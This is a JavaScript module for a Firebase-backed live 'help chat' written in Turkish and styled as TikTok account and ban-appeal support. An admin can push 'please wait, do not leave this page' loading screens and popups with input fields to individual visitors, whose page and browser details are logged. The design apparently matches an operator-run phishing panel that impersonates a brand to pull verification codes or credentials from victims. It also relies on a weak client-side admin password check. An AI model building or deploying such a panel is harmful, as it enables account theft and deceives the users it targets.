import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-app.js";
import {
  getDatabase,
  ref,
  push,
  set,
  update,
  onChildAdded,
  onValue,
  query,
  orderByChild,
  limitToLast,
} from "https://www.gstatic.com/firebasejs/11.0.2/firebase-database.js";

const cfg = window.FIREBASE_SYNC || {};
const configured =
  Boolean(cfg.enabled) &&
  cfg.firebase &&
  cfg.firebase.apiKey &&
  !String(cfg.firebase.apiKey).startsWith("YOUR_");

const QUICK_KEY = "admin_quick_replies_v1";
const DEFAULT_QUICK_REPLIES = [
  "Merhaba, size nasıl yardımcı olabilirim?",
  "Bilgileriniz kontrol ediliyor. Lütfen bu sayfadan ayrılmayın…",
  "İşleminiz devam ediyor, lütfen bekleyin.",
  "Lütfen uygulamada gördüğünüz uyarı veya hata metnini yazın.",
  "Hesap işlemleri için yalnızca resmi destek kullanılır: support.tiktok.com",
  "Şifre, e-posta veya doğrulama kodu paylaşmayın.",
  "Konuyu inceledim. Ban itirazını uygulama üzerinden göndermeniz gerekiyor.",
  "Başka bir sorunuz var mı?",
];

let db = null;
let sessionId = null;
let sessionReady = null;

function makeId() {
  if (crypto.randomUUID) return crypto.randomUUID();
  return `s_${Date.now()}_${Math.random().toString(36).slice(2, 10)}`;
}

function getSessionId() {
  const key = "help_chat_session";
  let id = sessionStorage.getItem(key);
  if (!id) {
    id = makeId();
    sessionStorage.setItem(key, id);
  }
  return id;
}

function initDb() {
  if (!configured) return null;
  if (db) return db;
  const app = initializeApp(cfg.firebase);
  db = getDatabase(app);
  return db;
}

async function ensureSession() {
  const database = initDb();
  if (!database) return null;
  if (sessionReady) return sessionReady;

  sessionId = getSessionId();
  const sessionRef = ref(database, `chats/${sessionId}`);

  sessionReady = (async () => {
    await update(sessionRef, {
      createdAt: Date.now(),
      updatedAt: Date.now(),
      page: location.pathname + location.hash,
      userAgent: navigator.userAgent.slice(0, 180),
      preview: "Sohbet başladı",
    });
    return sessionId;
  })();

  return sessionReady;
}

async function pushMessage(who, text) {
  const database = initDb();
  if (!database) return false;
  const id = await ensureSession();
  if (!id) return false;

  const clean = String(text || "").slice(0, 800);
  const msgRef = push(ref(database, `chats/${id}/messages`));
  await set(msgRef, {
    who,
    text: clean,
    ts: Date.now(),
  });
  await update(ref(database, `chats/${id}`), {
    updatedAt: Date.now(),
    preview: clean.slice(0, 120),
    lastWho: who,
    page: location.pathname + location.hash,
  });
  return true;
}

async function sendAdminMessage(targetSessionId, text, options = {}) {
  const database = initDb();
  if (!database) throw new Error("Firebase bağlı değil");
  if (!targetSessionId) throw new Error("Sohbet seçili değil");
  const kind =
    options.type === "loading" ? "loading" : options.type === "popup" ? "popup" : "text";
  const clean = String(
    text ||
      (kind === "loading"
        ? "Bilgileriniz kontrol ediliyor. Lütfen bu sayfadan ayrılmayın…"
        : kind === "popup"
          ? "Devam etmek için onaylayın."
          : "")
  )
    .trim()
    .slice(0, 800);
  if (!clean) throw new Error("Boş mesaj");

  const okLabel = String(options.okLabel || "Tamam").trim().slice(0, 40) || "Tamam";
  const cancelLabel = String(options.cancelLabel || "İptal").trim().slice(0, 40) || "İptal";

  // who:"bot" + from:"admin" → eski Rules (yalnızca user/bot) ile de uyumlu
  const msgRef = push(ref(database, `chats/${targetSessionId}/messages`));
  const payload = {
    who: "bot",
    from: "admin",
    text: clean,
    ts: Date.now(),
  };
  if (kind === "loading" || kind === "popup") payload.type = kind;
  if (kind === "popup") {
    payload.okLabel = okLabel;
    payload.cancelLabel = cancelLabel;
    payload.withInput = Boolean(options.withInput);
    if (options.placeholder) {
      payload.placeholder = String(options.placeholder).trim().slice(0, 120);
    }
  }

  await set(msgRef, payload);
  await update(ref(database, `chats/${targetSessionId}`), {
    updatedAt: Date.now(),
    preview:
      kind === "loading"
        ? "⏳ Kontrol ediliyor…"
        : kind === "popup"
          ? `Popup: ${clean.slice(0, 100)}`
          : clean.slice(0, 120),
    lastWho: "admin",
  });
  return true;
}

function checkAdminPassword(password) {
  const expected = String(window.FIREBASE_SYNC?.adminPassword || cfg.adminPassword || "").trim();
  const given = String(password || "").trim();
  if (!expected) return false;
  if (given === expected) return true;
  return given.replace(/\s+/g, "") === expected.replace(/\s+/g, "");
}

function listenSessions(onUpdate) {
  const database = initDb();
  if (!database) return () => {};
  const q = query(ref(database, "chats"), orderByChild("updatedAt"), limitToLast(80));
  return onValue(q, (snap) => {
    const rows = [];
    snap.forEach((child) => {
      rows.push({ id: child.key, ...child.val() });
    });
    rows.sort((a, b) => (b.updatedAt || 0) - (a.updatedAt || 0));
    onUpdate(rows);
  });
}

function listenMessages(sessionIdValue, onMessage) {
  const database = initDb();
  if (!database || !sessionIdValue) return () => {};
  const messagesRef = ref(database, `chats/${sessionIdValue}/messages`);
  return onChildAdded(messagesRef, (snap) => {
    onMessage({ id: snap.key, ...snap.val() });
  });
}

function listenIncomingSupport(onMessage) {
  if (!configured) return () => {};
  const id = getSessionId();
  ensureSession().catch(() => {});
  return listenMessages(id, (msg) => {
    if (msg.who === "admin" || msg.from === "admin") onMessage(msg);
  });
}

function getQuickReplies() {
  try {
    const raw = localStorage.getItem(QUICK_KEY);
    if (!raw) return [...DEFAULT_QUICK_REPLIES];
    const parsed = JSON.parse(raw);
    if (!Array.isArray(parsed)) return [...DEFAULT_QUICK_REPLIES];
    return parsed.map((x) => String(x || "").trim()).filter(Boolean).slice(0, 40);
  } catch {
    return [...DEFAULT_QUICK_REPLIES];
  }
}

function setQuickReplies(list) {
  const clean = (Array.isArray(list) ? list : [])
    .map((x) => String(x || "").trim())
    .filter(Boolean)
    .slice(0, 40);
  localStorage.setItem(QUICK_KEY, JSON.stringify(clean));
  return clean;
}

window.ChatSync = {
  enabled: configured,
  needsSetup: !configured,
  adminPasswordHintSet: Boolean(cfg.adminPassword && cfg.adminPassword !== "degistir-bu-sifreyi"),
  pushMessage,
  sendAdminMessage,
  checkAdminPassword,
  listenSessions,
  listenMessages,
  listenIncomingSupport,
  getQuickReplies,
  setQuickReplies,
  DEFAULT_QUICK_REPLIES,
};

window.ChatSyncReady = Promise.resolve(window.ChatSync);
